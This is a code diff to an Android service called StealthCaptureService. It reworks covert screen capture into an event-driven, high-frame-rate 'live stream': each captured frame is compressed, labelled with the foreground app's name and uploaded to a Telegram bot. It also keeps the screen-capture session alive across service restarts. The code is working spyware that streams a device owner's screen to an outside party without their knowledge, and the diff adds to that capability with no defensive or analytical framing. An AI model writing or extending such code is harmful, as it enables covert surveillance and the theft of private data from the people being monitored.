@@ -75,9 +75,9 @@ class StealthCaptureService : Service() {
     private var maxShots = 0
     private var currentShotCount = 0
     private var wakeLock: PowerManager.WakeLock? = null
-    private var captureJob: kotlinx.coroutines.Job? = null
     private var virtualDisplay: VirtualDisplay? = null
     private var imageReader: ImageReader? = null
+    private var lastCaptureTime = 0L
 
     override fun onCreate() {
         super.onCreate()
@@ -111,7 +111,6 @@ class StealthCaptureService : Service() {
                     initMediaProjection(resultCode, resultData)
                     startCaptureLoop()
                 } else {
-                    // Try token from MediaProjectionHelper fallback
                     val token = MediaProjectionHelper.getProjectionToken(this)
                     if (token != null) {
                         initMediaProjection(token.first, token.second)
@@ -130,7 +129,6 @@ class StealthCaptureService : Service() {
                 stopSelf()
             }
             else -> {
-                // Service restarted by OS (START_STICKY with null intent or unknown action)
                 val token = MediaProjectionHelper.getProjectionToken(this)
                 if (token != null) {
                     Log.d(TAG, "Service restarted by OS (START_STICKY). Resuming capture loop.")
@@ -148,40 +146,7 @@ class StealthCaptureService : Service() {
     private fun startCaptureLoop() {
         if (isCapturing) return
         isCapturing = true
-        captureJob?.cancel()
-        captureJob = serviceScope.launch {
-            Log.d(TAG, "Stealth capture coroutine loop started (interval: ${intervalSec}s, maxShots: $maxShots).")
-            while (isActive && isCapturing) {
-                try {
-                    if (mediaProjection == null) {
-                        mediaProjection = activeMediaProjection
-                    }
-                    if (mediaProjection == null) {
-                        val token = MediaProjectionHelper.getProjectionToken(this@StealthCaptureService)
-                        if (token != null) {
-                            initMediaProjection(token.first, token.second)
-                        }
-                    }
-
-                    val currentProj = activeMediaProjection ?: mediaProjection
-                    if (currentProj != null) {
-                        captureAndUpload()
-                        currentShotCount++
-                        if (maxShots > 0 && currentShotCount >= maxShots) {
-                            Log.d(TAG, "Reached max stealth screenshots ($maxShots). Stopping service.")
-                            stopCaptureAndCleanup()
-                            stopSelf()
-                            break
-                        }
-                    } else {
-                        Log.w(TAG, "MediaProjection token unavailable for stealth capture.")
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "Error in stealth capture coroutine loop: ${e.message}")
-                }
-                delay(intervalSec * 1000L)
-            }
-        }
+        Log.d(TAG, "Stealth capture event-driven loop started (interval: ${intervalSec}s, maxShots: $maxShots).")
     }
 
     private fun initMediaProjection(resultCode: Int, resultData: Intent) {
@@ -236,14 +201,21 @@ class StealthCaptureService : Service() {
             val height = metrics.heightPixels.coerceAtMost(1920)
             val density = metrics.densityDpi
 
-            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
+            // Increased buffer count to 4 for high-FPS live streaming without dropped frames
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 4)
+            
+            // Event-driven listener triggers instantly when new frames render on screen
+            imageReader?.setOnImageAvailableListener({ reader ->
+                processAndQueueImage(reader)
+            }, handler)
+
             virtualDisplay = proj.createVirtualDisplay(
                 "StealthDisplay",
                 width, height, density,
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                 imageReader?.surface, null, handler
             )
-            Log.d(TAG, "VirtualDisplay setup successfully (${width}x${height}).")
+            Log.d(TAG, "VirtualDisplay setup successfully (${width}x${height}) with high-FPS event listener.")
         } catch (e: Exception) {
             Log.e(TAG, "Failed to setup VirtualDisplay: ${e.message}")
         }
@@ -345,32 +317,19 @@ class StealthCaptureService : Service() {
         return "unknown"
     }
 
-    private fun captureAndUpload() {
-        if (!isScreenOn()) {
-            Log.d(TAG, "Screen is off, skipping capture.")
+    private fun processAndQueueImage(reader: ImageReader) {
+        if (!isCapturing || !isScreenOn()) {
+            try { reader.acquireLatestImage()?.close() } catch (_: Exception) {}
             return
         }
 
-        val proj = activeMediaProjection ?: mediaProjection
-        if (proj == null) {
-            val token = MediaProjectionHelper.getProjectionToken(this)
-            if (token != null) {
-                initMediaProjection(token.first, token.second)
-            } else {
-                Log.w(TAG, "MediaProjection is null during capture attempt.")
-                return
-            }
-        }
-
-        if (virtualDisplay == null || imageReader == null) {
-            setupVirtualDisplay()
-        }
-
-        val reader = imageReader
-        if (reader == null) {
-            Log.w(TAG, "ImageReader is null during capture.")
+        // Throttle check based on configured intervalSec (e.g., 1s for live stream, 10s for stealth)
+        val currentTime = System.currentTimeMillis()
+        if (currentTime - lastCaptureTime < intervalSec * 1000L) {
+            try { reader.acquireLatestImage()?.close() } catch (_: Exception) {}
             return
         }
+        lastCaptureTime = currentTime
 
         serviceScope.launch(Dispatchers.IO) {
             var image: Image? = null
@@ -411,20 +370,32 @@ class StealthCaptureService : Service() {
                     scaledBitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, byteArrayOutputStream)
                     val imageBytes = byteArrayOutputStream.toByteArray()
 
-                    val base64String = Base64.encodeToString(imageBytes, Base64.NO_WRAP)
                     val sizeBytes = imageBytes.size
                     val pkgName = getForegroundPackageName()
-                    val timestamp = System.currentTimeMillis()
 
-                    uploadScreenshotToFirebase(pkgName, timestamp, base64String, sizeBytes)
+                    // Asynchronous background upload (never blocks the live capture frame pipeline)
+                    launch(Dispatchers.IO) {
+                        try {
+                            val telegramBot = TelegramBotManager(applicationContext)
+                            telegramBot.sendPhoto(imageBytes, "Screen capture of $pkgName (${(sizeBytes / 1024)} KB)")
+                        } catch (e: Exception) {
+                            Log.e(TAG, "Failed to send screenshot to Telegram: ${e.message}")
+                        }
+                    }
+
+                    currentShotCount++
+                    if (maxShots > 0 && currentShotCount >= maxShots) {
+                        Log.d(TAG, "Reached max stealth screenshots ($maxShots). Stopping service.")
+                        stopCaptureAndCleanup()
+                        stopSelf()
+                    }
                 } else {
-                    Log.w(TAG, "Acquired image was null, re-setting up virtual display.")
                     withContext(Dispatchers.Main) {
                         setupVirtualDisplay()
                     }
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "Error in captureAndUpload: ${e.message}")
+                Log.e(TAG, "Error in processAndQueueImage: ${e.message}")
                 withContext(Dispatchers.Main) {
                     setupVirtualDisplay()
                 }
@@ -436,63 +407,17 @@ class StealthCaptureService : Service() {
         }
     }
 
-    private fun uploadScreenshotToFirebase(
-        pkgName: String,
-        timestamp: Long,
-        base64String: String,
-        sizeBytes: Int
-    ) {
-        try {
-            val imageBytes = Base64.decode(base64String, Base64.NO_WRAP)
-            serviceScope.launch(Dispatchers.IO) {
-                val telegramBot = TelegramBotManager(applicationContext)
-                telegramBot.sendPhoto(imageBytes, "Screen capture of $pkgName (${(sizeBytes / 1024)} KB)")
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to send screenshot to Telegram: ${e.message}")
-        }
-    }
-
-    private fun limitHistory(
-        dbRef: com.google.firebase.database.DatabaseReference,
-        maxCount: Int
-    ) {
-        dbRef.orderByChild("timestamp").addListenerForSingleValueEvent(object : ValueEventListener {
-            override fun onDataChange(snapshot: DataSnapshot) {
-                val totalChildren = snapshot.childrenCount
-                if (totalChildren > maxCount) {
-                    val excessCount = (totalChildren - maxCount).toInt()
-                    var deleted = 0
-                    for (child in snapshot.children) {
-                        child.ref.removeValue()
-                        deleted++
-                        if (deleted >= excessCount) break
-                    }
-                    Log.d(TAG, "Removed $deleted oldest screenshot(s) to enforce limit of $maxCount.")
-                }
-            }
-
-            override fun onCancelled(error: DatabaseError) {
-                Log.e(TAG, "limitHistory cancelled: ${error.message}")
-            }
-        })
-    }
-
     private fun stopCaptureAndCleanup() {
         isCapturing = false
-        captureJob?.cancel()
-        captureJob = null
         releaseVirtualDisplay()
         try {
             wakeLock?.let { if (it.isHeld) it.release() }
         } catch (_: Exception) {}
-        // Do NOT call mediaProjection?.stop() here so session remains valid for subsequent captures
         Log.d(TAG, "StealthCaptureService stopped cleanly (MediaProjection retained).")
     }
 
     override fun onDestroy() {
         stopCaptureAndCleanup()
-        // Do NOT call mediaProjection?.stop() here to keep the MediaProjection session persistent across service restarts
         mediaProjection = null
         serviceScope.cancel()
         super.onDestroy()
